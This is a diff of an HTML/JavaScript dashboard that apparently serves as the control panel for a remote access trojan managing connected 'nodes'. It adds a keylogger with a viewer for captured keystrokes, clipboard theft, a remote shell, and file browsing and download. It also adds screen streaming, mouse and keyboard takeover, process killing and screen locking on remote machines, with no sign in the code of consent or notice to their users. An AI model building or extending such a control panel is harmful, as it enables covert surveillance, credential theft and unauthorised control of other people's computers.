+            <button class="btn btn-green" onclick="shellRun()">RUN</button>
+          </div>
+        </div>
+      </div>
+      <!-- FILES -->
+      <div class="feat-panel" id="fp-files">
+        <div class="feat-top"><div class="feat-title">FILE BROWSER</div><div class="feat-actions"><button class="btn btn-green" onclick="filesLoad(currentPath)">↻ REFRESH</button></div></div>
+        <div class="feat-body">
+          <div class="path-bar">
+            <span style="color:var(--dim);font-size:10px">PATH:</span>
+            <input class="path-input" id="path-input" placeholder="Enter path..." onkeydown="if(event.key==='Enter')filesLoad(this.value)">
+            <button class="btn btn-blue" onclick="filesLoad(document.getElementById('path-input').value)">GO</button>
+          </div>
+          <div id="files-content" style="color:var(--dim);font-size:12px">Loading...</div>
+        </div>
+      </div>
+      <!-- MISC -->
+      <div class="feat-panel" id="fp-misc">
+        <div class="feat-top"><div class="feat-title">MISC CONTROLS</div></div>
+        <div class="feat-body">
+          <div class="misc-grid">
+            <div class="misc-card">
+              <div class="misc-card-title">Alert Popup</div>
+              <input class="misc-input" id="alert-msg" placeholder="Message to show...">
+              <button class="btn btn-warn" onclick="sendAlert()">SEND ALERT</button>
+            </div>
+            <div class="misc-card">
+              <div class="misc-card-title">Open URL</div>
+              <input class="misc-input" id="url-input" placeholder="https://...">
+              <button class="btn btn-blue" onclick="openUrl()">OPEN IN BROWSER</button>
+            </div>
+            <div class="misc-card">
+              <div class="misc-card-title">Lock Screen</div>
+              <div style="font-size:10px;color:var(--dim);margin-bottom:10px">Lock the remote machine's screen immediately.</div>
+              <button class="btn btn-red" onclick="lockScreen()">🔒 LOCK SCREEN</button>
+            </div>
+            <div class="misc-card">
+              <div class="misc-card-title">Screenshot → Save</div>
+              <div style="font-size:10px;color:var(--dim);margin-bottom:10px">Capture and download the screen as a JPEG.</div>
+              <button class="btn btn-green" onclick="screenshotDownload()">📥 CAPTURE & DOWNLOAD</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
 
 <script>
 const socket = io();
-let clients = [];
-let activeClientId = null;
-let mouseEnabled = false;
-let kbdEnabled = false;
-let frameCount = 0;
-let lastFpsTime = Date.now();
+let clients=[], activeId=null, mouseOn=false, kbdOn=false;
+let fc=0, lastFps=Date.now(), currentPath='~';
+let pendingCmds={};
+let keylogging=false;
 
-// Clock
-setInterval(() => { document.getElementById('clock').textContent = new Date().toTimeString().slice(0,8); }, 1000);
+setInterval(()=>{ document.getElementById('clock').textContent=new Date().toTimeString().slice(0,8); },1000);
 
-function addLog(msg, type='info') {
-  const log = document.getElementById('log');
-  const time = new Date().toTimeString().slice(0,8);
-  const d = document.createElement('div');
-  d.className = 'log-line';
-  d.innerHTML = `<span class="log-time">[${time}]</span><span class="log-msg ${type}">${msg}</span>`;
-  log.appendChild(d); log.scrollTop = log.scrollHeight;
-  while (log.children.length > 60) log.removeChild(log.firstChild);
+function toast(msg,type='ok'){
+  const t=document.getElementById('toast');
+  t.textContent=msg; t.className='toast show '+(type==='ok'?'ok':'err');
+  clearTimeout(t._t); t._t=setTimeout(()=>t.className='toast',2500);
 }
 
-function timeSince(iso) {
-  const d = Math.floor((Date.now() - new Date(iso)) / 1000);
-  if (d < 60) return d + 's ago';
-  if (d < 3600) return Math.floor(d/60) + 'm ago';
-  return Math.floor(d/3600) + 'h ago';
+function addLog(msg,type='info'){
+  const log=document.getElementById('log');
+  const d=document.createElement('div'); d.className='ll';
+  d.innerHTML=`<span class="lt">[${new Date().toTimeString().slice(0,8)}]</span><span class="lm ${type}">${msg}</span>`;
+  log.appendChild(d); log.scrollTop=log.scrollHeight;
+  while(log.children.length>80)log.removeChild(log.firstChild);
 }
 
-function render(data) {
-  const prev = Object.fromEntries(clients.map(c => [c.id, c.status]));
-  clients = data;
-  data.forEach(c => {
-    const was = prev[c.id];
-    if (!was) addLog(`NEW NODE: ${c.hostname} (${c.ip})`, 'connect');
-    else if (was==='online' && c.status==='offline') addLog(`OFFLINE: ${c.hostname}`, 'disconnect');
-    else if (was==='offline' && c.status==='online') addLog(`BACK ONLINE: ${c.hostname}`, 'connect');
-  });
-  document.getElementById('stat-total').textContent = data.length;
-  document.getElementById('stat-online').textContent = data.filter(c=>c.status==='online').length;
-  document.getElementById('stat-offline').textContent = data.filter(c=>c.status==='offline').length;
-  document.getElementById('last-update').textContent = 'UPDATED ' + new Date().toTimeString().slice(0,8);
+function ts(iso){ const d=Math.floor((Date.now()-new Date(iso))/1000); return d<60?d+'s ago':d<3600?Math.floor(d/60)+'m ago':Math.floor(d/3600)+'h ago'; }
 
-  const container = document.getElementById('table-container');
-  if (!data.length) {
-    container.innerHTML = `<div class="empty-state"><div class="icon">⬡</div><p>NO NODES CONNECTED</p></div>`;
-    return;
-  }
-  container.innerHTML = `<table><thead><tr>
-    <th>Hostname</th><th>IP</th><th>Username</th><th>Platform</th><th>Last Seen</th><th>Status</th><th>Action</th>
-  </tr></thead><tbody>${data.map(c=>`
-    <tr class="clickable">
-      <td class="hostname">${c.hostname}</td>
-      <td class="ip">${c.ip}</td>
-      <td>${c.username}</td>
-      <td><span class="platform">${c.platform}</span></td>
-      <td style="font-size:12px;color:var(--dim)">${timeSince(c.last_seen)}</td>
-      <td><span class="status-badge ${c.status}">${c.status.toUpperCase()}</span></td>
-      <td><button class="view-btn" onclick="openViewer('${c.id}','${c.hostname}')" ${c.status==='offline'?'disabled':''}>▶ VIEW</button></td>
-    </tr>`).join('')}
-  </tbody></table>`;
+function render(data){
+  const prev=Object.fromEntries(clients.map(c=>[c.id,c.status]));
+  clients=data;
+  data.forEach(c=>{ const w=prev[c.id]; if(!w)addLog(`NEW: ${c.hostname} (${c.ip})`,'connect'); else if(w==='online'&&c.status==='offline')addLog(`OFFLINE: ${c.hostname}`,'disconnect'); else if(w==='offline'&&c.status==='online')addLog(`ONLINE: ${c.hostname}`,'connect'); });
+  document.getElementById('st').textContent=data.length;
+  document.getElementById('so').textContent=data.filter(c=>c.status==='online').length;
+  document.getElementById('sf').textContent=data.filter(c=>c.status==='offline').length;
+  document.getElementById('lu').textContent='UPDATED '+new Date().toTimeString().slice(0,8);
+  const tc=document.getElementById('tc');
+  if(!data.length){ tc.innerHTML=`<div class="empty-state"><div class="ic">⬡</div><p>NO NODES CONNECTED</p></div>`; return; }
+  tc.innerHTML=`<table><thead><tr><th>Hostname</th><th>IP</th><th>User</th><th>Platform</th><th>Last Seen</th><th>Status</th><th>Actions</th></tr></thead><tbody>${data.map(c=>`<tr class="cr"><td class="hn">${c.hostname}</td><td style="color:var(--dim);font-size:11px">${c.ip}</td><td>${c.username}</td><td><span class="plat">${c.platform}</span></td><td style="font-size:11px;color:var(--dim)">${ts(c.last_seen)}</td><td><span class="sb ${c.status}">${c.status.toUpperCase()}</span></td><td style="display:flex;gap:6px"><button class="btn btn-green" onclick="openViewer('${c.id}','${c.hostname}')" ${c.status==='offline'?'disabled':''}>▶ VIEW</button><button class="btn btn-blue" onclick="openFeatDirect('${c.id}','${c.hostname}')" ${c.status==='offline'?'disabled':''}>⚙ FEATURES</button></td></tr>`).join('')}</tbody></table>`;
 }
 
-// ── VIEWER ──────────────────────────────────────────────────────
+// ── VIEWER ────────────────────────────────────────────────────────
 
-function openViewer(clientId, hostname) {
-  activeClientId = clientId;
-  document.getElementById('modal-title').textContent = `REMOTE — ${hostname.toUpperCase()}`;
-  document.getElementById('target-info').textContent = hostname;
+function openViewer(cid,hostname){
+  activeId=cid;
+  document.getElementById('vmt').textContent=`REMOTE — ${hostname.toUpperCase()}`;
+  document.getElementById('tgt').textContent=hostname;
   document.getElementById('viewer-modal').classList.add('open');
-  document.getElementById('no-stream').style.display = 'block';
-  document.getElementById('screen-container').style.display = 'none';
-  document.getElementById('toggle-mouse').checked = false;
-  document.getElementById('toggle-kbd').checked = false;
-  mouseEnabled = false; kbdEnabled = false;
-  updateToggleLabels();
-  socket.emit('viewer_watch', { client_id: clientId });
-  addLog(`Opened viewer for ${hostname}`, 'info');
+  document.getElementById('ns').style.display='block';
+  document.getElementById('scw').style.display='none';
+  document.getElementById('tm').checked=false;
+  document.getElementById('tk').checked=false;
+  mouseOn=false; kbdOn=false; updateToggles();
+  socket.emit('viewer_watch',{client_id:cid});
+  addLog(`Viewing ${hostname}`,'info');
 }
 
-function closeViewer() {
-  if (activeClientId) socket.emit('viewer_unwatch', { client_id: activeClientId });
-  activeClientId = null;
-  mouseEnabled = false; kbdEnabled = false;
+function closeViewer(){
+  if(activeId) socket.emit('viewer_unwatch',{client_id:activeId});
   document.getElementById('viewer-modal').classList.remove('open');
-  document.getElementById('screen-canvas').classList.remove('mouse-active');
-  document.getElementById('cursor-dot').style.display = 'none';
+  document.getElementById('feat-modal').classList.remove('open');
+  activeId=null; mouseOn=false; kbdOn=false;
+  document.getElementById('sc').classList.remove('ma');
+  document.getElementById('cdot').style.display='none';
 }
 
-function toggleMouse(el) {
-  mouseEnabled = el.checked;
-  updateToggleLabels();
-  const canvas = document.getElementById('screen-canvas');
-  if (mouseEnabled) canvas.classList.add('mouse-active');
-  else canvas.classList.remove('mouse-active');
-  document.getElementById('cursor-dot').style.display = mouseEnabled ? 'block' : 'none';
+function toggleMouse(el){ mouseOn=el.checked; updateToggles(); document.getElementById('sc').classList.toggle('ma',mouseOn); document.getElementById('cdot').style.display=mouseOn?'block':'none'; }
+function toggleKbd(el){ kbdOn=el.checked; updateToggles(); }
+function updateToggles(){
+  document.getElementById('mlbl').textContent=`Mouse: ${mouseOn?'ON':'OFF'}`; document.getElementById('mlbl').style.color=mouseOn?'var(--accent)':'var(--dim)';
+  document.getElementById('klbl').textContent=`Keyboard: ${kbdOn?'ON':'OFF'}`; document.getElementById('klbl').style.color=kbdOn?'var(--accent)':'var(--dim)';
 }
 
-function toggleKbd(el) {
-  kbdEnabled = el.checked;
-  updateToggleLabels();
-  if (kbdEnabled) document.getElementById('kbd-input').focus();
+const sc=document.getElementById('sc'), cdot=document.getElementById('cdot');
+sc.addEventListener('mousemove',e=>{ if(!mouseOn||!activeId)return; const r=sc.getBoundingClientRect(); const sx=sc.width/r.width,sy=sc.height/r.height; socket.emit('mouse_move',{client_id:activeId,x:Math.round((e.clientX-r.left)*sx),y:Math.round((e.clientY-r.top)*sy)}); cdot.style.left=(e.clientX-r.left)+'px'; cdot.style.top=(e.clientY-r.top)+'px'; });
+sc.addEventListener('click',e=>{ if(!mouseOn||!activeId)return; const r=sc.getBoundingClientRect(); const sx=sc.width/r.width,sy=sc.height/r.height; socket.emit('mouse_click',{client_id:activeId,x:Math.round((e.clientX-r.left)*sx),y:Math.round((e.clientY-r.top)*sy),button:'left'}); });
+sc.addEventListener('contextmenu',e=>{ e.preventDefault(); if(!mouseOn||!activeId)return; const r=sc.getBoundingClientRect(); const sx=sc.width/r.width,sy=sc.height/r.height; socket.emit('mouse_click',{client_id:activeId,x:Math.round((e.clientX-r.left)*sx),y:Math.round((e.clientY-r.top)*sy),button:'right'}); });
+document.addEventListener('keydown',e=>{ if(!kbdOn||!activeId)return; if(!document.getElementById('viewer-modal').classList.contains('open'))return; if(document.activeElement.tagName==='INPUT'||document.activeElement.tagName==='TEXTAREA')return; e.preventDefault(); socket.emit('key_press',{client_id:activeId,key:e.key}); });
+document.addEventListener('keydown',e=>{ if(e.key==='Escape'&&!kbdOn){ if(document.getElementById('feat-modal').classList.contains('open'))closeFeatures(); else closeViewer(); }});
+
+socket.on('screen_frame',data=>{
+  if(data.client_id!==activeId)return;
+  const img=new Image(); img.onload=()=>{ if(sc.width!==img.width||sc.height!==img.height){sc.width=img.width;sc.height=img.height;document.getElementById('res').textContent=`${img.width}×${img.height}`;} sc.getContext('2d').drawImage(img,0,0); document.getElementById('ns').style.display='none'; document.getElementById('scw').style.display='block'; }; img.src='data:image/jpeg;base64,'+data.frame;
+  fc++; const now=Date.now(); if(now-lastFps>=1000){document.getElementById('fps').textContent=fc;fc=0;lastFps=now;}
+});
+
+// ── FEATURES ─────────────────────────────────────────────────────
+
+function openFeatures(){
+  if(!activeId)return;
+  document.getElementById('fmt').textContent=`FEATURES — ${document.getElementById('tgt').textContent.toUpperCase()}`;
+  document.getElementById('feat-modal').classList.add('open');
+  filesLoad(null);
+}
+function openFeatDirect(cid,hostname){
+  activeId=cid;
+  document.getElementById('tgt').textContent=hostname;
+  socket.emit('viewer_watch',{client_id:cid});
+  document.getElementById('fmt').textContent=`FEATURES — ${hostname.toUpperCase()}`;
+  document.getElementById('feat-modal').classList.add('open');
+  filesLoad(null);
+}
+function closeFeatures(){ document.getElementById('feat-modal').classList.remove('open'); }
+
+function showFeat(name){
+  document.querySelectorAll('.feat-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.fitem').forEach(i=>i.classList.remove('active'));
+  document.getElementById('fp-'+name).classList.add('active');
+  document.getElementById('fi-'+name).classList.add('active');
 }
 
-function updateToggleLabels() {
-  document.getElementById('mouse-label').textContent = `Mouse: ${mouseEnabled ? 'ON' : 'OFF'}`;
-  document.getElementById('kbd-label').textContent = `Keyboard: ${kbdEnabled ? 'ON' : 'OFF'}`;
-  document.getElementById('mouse-label').style.color = mouseEnabled ? 'var(--accent)' : 'var(--dim)';
-  document.getElementById('kbd-label').style.color = kbdEnabled ? 'var(--accent)' : 'var(--dim)';
+function sendCmd(action, extra={}){
+  return new Promise((resolve,reject)=>{
+    if(!activeId){reject('No active client'); return;}
+    const rid = Math.random().toString(36).slice(2);
+    pendingCmds[rid]={resolve,reject};
+    setTimeout(()=>{ if(pendingCmds[rid]){delete pendingCmds[rid]; reject('Timeout');} },15000);
+    socket.emit('cmd',{client_id:activeId, action, rid, ...extra});
+  });
 }
 
-// ── Screen rendering ────────────────────────────────────────────
+socket.on('cmd_response',data=>{
+  const cb=pendingCmds[data.rid];
+  if(cb){ delete pendingCmds[data.rid]; if(data.status==='ok') cb.resolve(data); else cb.reject(data.msg||'Error'); }
+});
 
-socket.on('screen_frame', (data) => {
-  if (data.client_id !== activeClientId) return;
-  const canvas = document.getElementById('screen-canvas');
-  const ctx = canvas.getContext('2d');
-  const img = new Image();
-  img.onload = () => {
-    if (canvas.width !== img.width || canvas.height !== img.height) {
-      canvas.width = img.width; canvas.height = img.height;
-      document.getElementById('res-info').textContent = `${img.width}×${img.height}`;
-    }
-    ctx.drawImage(img, 0, 0);
-    document.getElementById('no-stream').style.display = 'none';
-    document.getElementById('screen-container').style.display = 'block';
-  };
-  img.src = 'data:image/jpeg;base64,' + data.frame;
-  frameCount++;
-  const now = Date.now();
-  if (now - lastFpsTime >= 1000) {
-    document.getElementById('fps-counter').textContent = frameCount;
-    frameCount = 0; lastFpsTime = now;
+// Keylogger
+socket.on('keylog_data',data=>{
+  if(data.client_id!==activeId)return;
+  const box=document.getElementById('kl-box');
+  if(box.textContent==='Keylog output will appear here...')box.innerHTML='';
+  let html='';
+  for(const ch of data.data.split('')){
+    if(ch==='['){html+=`<span class="kl-special">`;}
+    else if(ch===']'){html+=`]</span>`;}
+    else if(ch==='\n'||data.data.includes('[enter]')){html+=`<span class="kl-enter">↵</span>\n`;}
+    else{html+=ch;}
   }
+  box.innerHTML+=`<span class="kl-ts">[${data.ts}] </span>`+html;
+  box.scrollTop=box.scrollHeight;
+  addLog(`Keylog data from ${document.getElementById('tgt').textContent}`,'feature');
 });
 
-// ── Mouse forwarding ────────────────────────────────────────────
+async function klStart(){
+  try{ await sendCmd('keylog_start'); keylogging=true; document.getElementById('kl-start-btn').style.display='none'; document.getElementById('kl-stop-btn').style.display=''; toast('Keylogger started'); addLog('Keylogger started','feature'); }
+  catch(e){ toast(e,'err'); }
+}
+async function klStop(){
+  try{ await sendCmd('keylog_stop'); keylogging=false; document.getElementById('kl-start-btn').style.display=''; document.getElementById('kl-stop-btn').style.display='none'; toast('Keylogger stopped'); }
+  catch(e){ toast(e,'err'); }
+}
+function klClear(){ const b=document.getElementById('kl-box'); b.innerHTML='Keylog output will appear here...'; }
 
-const canvas = document.getElementById('screen-canvas');
-const cursorDot = document.getElementById('cursor-dot');
+// Screenshot
+async function takeScreenshot(){
+  try{
+    toast('Capturing...');
+    const r=await sendCmd('screenshot');
+    document.getElementById('ss-container').innerHTML=`<img src="data:image/jpeg;base64,${r.data}" style="max-width:100%;border:1px solid var(--border)"><br><button class="btn btn-blue" style="margin-top:10px" onclick="dlScreenshot('${r.data}')">📥 DOWNLOAD</button>`;
+  }catch(e){toast(e,'err');}
+}
+async function screenshotDownload(){
+  try{ toast('Capturing...'); const r=await sendCmd('screenshot'); dlScreenshot(r.data); toast('Downloaded!'); }
+  catch(e){ toast(e,'err'); }
+}
+function dlScreenshot(b64){
+  const a=document.createElement('a'); a.href='data:image/jpeg;base64,'+b64; a.download=`screenshot_${Date.now()}.jpg`; a.click();
+}
 
-canvas.addEventListener('mousemove', (e) => {
-  if (!mouseEnabled || !activeClientId) return;
-  const rect = canvas.getBoundingClientRect();
-  const scaleX = canvas.width / rect.width;
-  const scaleY = canvas.height / rect.height;
-  const x = Math.round((e.clientX - rect.left) * scaleX);
-  const y = Math.round((e.clientY - rect.top) * scaleY);
-  socket.emit('mouse_move', { client_id: activeClientId, x, y });
-  // Show cursor dot
-  cursorDot.style.left = (e.clientX - rect.left) + 'px';
-  cursorDot.style.top = (e.clientY - rect.top) + 'px';
-});
+// Clipboard
+async function clipGet(){
+  try{ const r=await sendCmd('clipboard_get'); document.getElementById('clip-box').textContent=r.data||'(empty)'; toast('Clipboard retrieved'); }
+  catch(e){ toast(e,'err'); }
+}
+async function clipSet(){
+  const text=document.getElementById('clip-set-val').value;
+  try{ await sendCmd('clipboard_set',{text}); toast('Clipboard set!'); }
+  catch(e){ toast(e,'err'); }
+}
 
-canvas.addEventListener('click', (e) => {
-  if (!mouseEnabled || !activeClientId) return;
-  const rect = canvas.getBoundingClientRect();
-  const scaleX = canvas.width / rect.width;
-  const scaleY = canvas.height / rect.height;
-  socket.emit('mouse_click', {
-    client_id: activeClientId,
-    x: Math.round((e.clientX - rect.left) * scaleX),
-    y: Math.round((e.clientY - rect.top) * scaleY),
-    button: 'left'
-  });
-});
+// Sysinfo
+async function loadSysinfo(){
+  document.getElementById('sysinfo-content').innerHTML='<span style="color:var(--dim)">Loading...</span>';
+  try{
+    const r=await sendCmd('sysinfo');
+    const d=r.data;
+    function pct(v){ const cls=v>85?'red':v>65?'warn':''; return `<div class="pbar-wrap"><div class="pbar-label"><span>${v}%</span></div><div class="pbar"><div class="pbar-fill ${cls}" style="width:${v}%"></div></div></div>`; }
+    document.getElementById('sysinfo-content').innerHTML=`
+    <div class="info-grid">
+      <div class="info-card"><div class="info-card-title">Identity</div>
+        <div class="info-row"><span class="k">Hostname</span><span class="v">${d.hostname}</span></div>
+        <div class="info-row"><span class="k">Username</span><span class="v">${d.username}</span></div>
+        <div class="info-row"><span class="k">Platform</span><span class="v">${d.platform}</span></div>
+        <div class="info-row"><span class="k">IP</span><span class="v">${d.ip}</span></div>
+        <div class="info-row"><span class="k">Boot Time</span><span class="v">${d.boot_time}</span></div>
+        <div class="info-row"><span class="k">Processes</span><span class="v">${d.process_count}</span></div>
+      </div>
+      <div class="info-card"><div class="info-card-title">CPU</div>
+        ${pct(d.cpu_percent)}
+        <div class="info-card-title" style="margin-top:10px">RAM — ${d.ram_used}GB / ${d.ram_total}GB</div>
+        ${pct(d.ram_percent)}
+        <div class="info-card-title" style="margin-top:10px">Disk — ${d.disk_used}GB / ${d.disk_total}GB</div>
+        ${pct(d.disk_percent)}
+      </div>
+    </div>`;
+    toast('System info loaded');
+  }catch(e){ document.getElementById('sysinfo-content').innerHTML=`<span style="color:var(--red)">${e}</span>`; toast(e,'err'); }
+}
 
-canvas.addEventListener('contextmenu', (e) => {
-  e.preventDefault();
-  if (!mouseEnabled || !activeClientId) return;
-  const rect = canvas.getBoundingClientRect();
-  const scaleX = canvas.width / rect.width;
-  const scaleY = canvas.height / rect.height;
-  socket.emit('mouse_click', {
-    client_id: activeClientId,
-    x: Math.round((e.clientX - rect.left) * scaleX),
-    y: Math.round((e.clientY - rect.top) * scaleY),
-    button: 'right'
-  });
-});
+// Processes
+async function loadProcesses(){
+  document.getElementById('proc-content').innerHTML='<span style="color:var(--dim)">Loading...</span>';
+  try{
+    const r=await sendCmd('processes');
+    document.getElementById('proc-content').innerHTML=`<table class="proc-table"><thead><tr><th>PID</th><th>Name</th><th>CPU%</th><th>MEM%</th><th>Status</th><th>Kill</th></tr></thead><tbody>
+    ${r.data.map(p=>`<tr><td style="color:var(--dim)">${p.pid}</td><td>${p.name||'-'}</td><td style="color:${(p.cpu_percent||0)>20?'var(--warn)':'inherit'}">${(p.cpu_percent||0).toFixed(1)}</td><td>${(p.memory_percent||0).toFixed(1)}</td><td style="color:var(--dim);font-size:10px">${p.status||'-'}</td><td><button class="btn btn-red" style="padding:2px 8px;font-size:9px" onclick="killProc(${p.pid},'${(p.name||'').replace(/'/g,'')}')" title="Kill">✕</button></td></tr>`).join('')}
+    </tbody></table>`;
+    toast('Processes loaded');
+  }catch(e){ document.getElementById('proc-content').innerHTML=`<span style="color:var(--red)">${e}</span>`; toast(e,'err'); }
+}
+async function killProc(pid,name){
+  if(!confirm(`Kill process ${name} (PID ${pid})?`))return;
+  try{ const r=await sendCmd('kill_process',{pid}); toast(r.msg); loadProcesses(); }
+  catch(e){ toast(e,'err'); }
+}
 
-// ── Keyboard forwarding ─────────────────────────────────────────
+// Shell
+async function shellRun(){
+  const inp=document.getElementById('shell-input');
+  const cmd=inp.value.trim(); if(!cmd)return;
+  inp.value='';
+  const out=document.getElementById('shell-out');
+  out.innerHTML+=`\n<span class="shell-cmd">$ ${cmd}</span>\n`;
+  out.scrollTop=out.scrollHeight;
+  try{
+    const r=await sendCmd('shell',{cmd});
+    if(r.stdout) out.innerHTML+=r.stdout;
+    if(r.stderr) out.innerHTML+=`<span class="shell-err">${r.stderr}</span>`;
+    out.scrollTop=out.scrollHeight;
+  }catch(e){ out.innerHTML+=`<span class="shell-err">Error: ${e}</span>\n`; out.scrollTop=out.scrollHeight; toast(e,'err'); }
+}
+function shellKey(e){ if(e.key==='Enter')shellRun(); }
+function shellClear(){ document.getElementById('shell-out').textContent='Remote shell ready.'; }
 
-document.addEventListener('keydown', (e) => {
-  if (!kbdEnabled || !activeClientId) return;
-  if (!document.getElementById('viewer-modal').classList.contains('open')) return;
-  e.preventDefault();
-  socket.emit('key_press', { client_id: activeClientId, key: e.key });
-});
+// Files
+async function filesLoad(path){
+  if(!path||path===null){
+    path='~';
+    const r=await sendCmd('ls',{path:'~'}).catch(()=>null);
+    if(r) path=r.path;
+  }
+  document.getElementById('path-input').value=path;
+  document.getElementById('files-content').innerHTML='<span style="color:var(--dim)">Loading...</span>';
+  try{
+    const r=await sendCmd('ls',{path});
+    currentPath=r.path;
+    document.getElementById('path-input').value=r.path;
+    const rows=r.data.map(f=>`
+    <div class="file-row ${f.is_dir?'dir':''}" onclick="${f.is_dir?`filesLoad('${(r.path+'/'+f.name).replace(/'/g,"\\'")}')`:``}">
+      <span class="fi-ico">${f.is_dir?'📁':'📄'}</span>
+      <span class="fi-name">${f.name}</span>
+      <span class="fi-size">${f.is_dir?'—':fmtSize(f.size)}</span>
+      <span class="fi-date">${f.modified}</span>
+      ${!f.is_dir?`<span class="fi-act"><button class="btn btn-blue" style="padding:2px 8px;font-size:9px" onclick="event.stopPropagation();dlFile('${(r.path+'/'+f.name).replace(/'/g,"\\'")}')">DL</button></span>`:''}
+    </div>`).join('');
+    const upPath = r.path.split('/').slice(0,-1).join('/') || r.path.split('\\').slice(0,-1).join('\\') || r.path;
+    document.getElementById('files-content').innerHTML=`
+    <div class="file-list">
+      ${r.path!=='/'&&r.path!=='~'?`<div class="file-row dir" onclick="filesLoad('${upPath}')"><span class="fi-ico">⬆</span><span class="fi-name">..</span><span class="fi-size">—</span><span class="fi-date"></span></div>`:''}
+      ${rows}
+    </div>`;
+  }catch(e){ document.getElementById('files-content').innerHTML=`<span style="color:var(--red)">${e}</span>`; toast(e,'err'); }
+}
+async function dlFile(path){
+  try{ toast('Downloading...'); const r=await sendCmd('download_file',{path}); const a=document.createElement('a'); a.href='data:application/octet-stream;base64,'+r.data; a.download=r.filename; a.click(); toast('Downloaded!'); }
+  catch(e){ toast(e,'err'); }
+}
+function fmtSize(b){ if(b<1024)return b+'B'; if(b<1024*1024)return (b/1024).toFixed(1)+'KB'; return (b/1024/1024).toFixed(1)+'MB'; }
 
-// ── Socket events ───────────────────────────────────────────────
+// Misc
+async function sendAlert(){ const msg=document.getElementById('alert-msg').value||'Hello!'; try{ const r=await sendCmd('alert',{msg}); toast(r.msg); }catch(e){ toast(e,'err'); }}
+async function openUrl(){ const url=document.getElementById('url-input').value; try{ const r=await sendCmd('open_url',{url}); toast(r.msg); }catch(e){ toast(e,'err'); }}
+async function lockScreen(){ if(!confirm('Lock the remote screen?'))return; try{ const r=await sendCmd('lock_screen'); toast(r.msg); }catch(e){ toast(e,'err'); }}
 
-socket.on('connect', () => { addLog('Dashboard connected', 'info'); socket.emit('request_clients'); });
-socket.on('client_update', (data) => render(data.clients || []));
-socket.on('disconnect', () => addLog('Lost server connection', 'disconnect'));
-
-// Close modal on ESC
-document.addEventListener('keydown', (e) => { if (e.key === 'Escape' && !kbdEnabled) closeViewer(); });
+// Socket
+socket.on('connect',()=>{ addLog('Dashboard connected','info'); socket.emit('request_clients'); });
+socket.on('client_update',data=>render(data.clients||[]));
+socket.on('disconnect',()=>addLog('Server connection lost','disconnect'));
 </script>
 </body>
 </html>
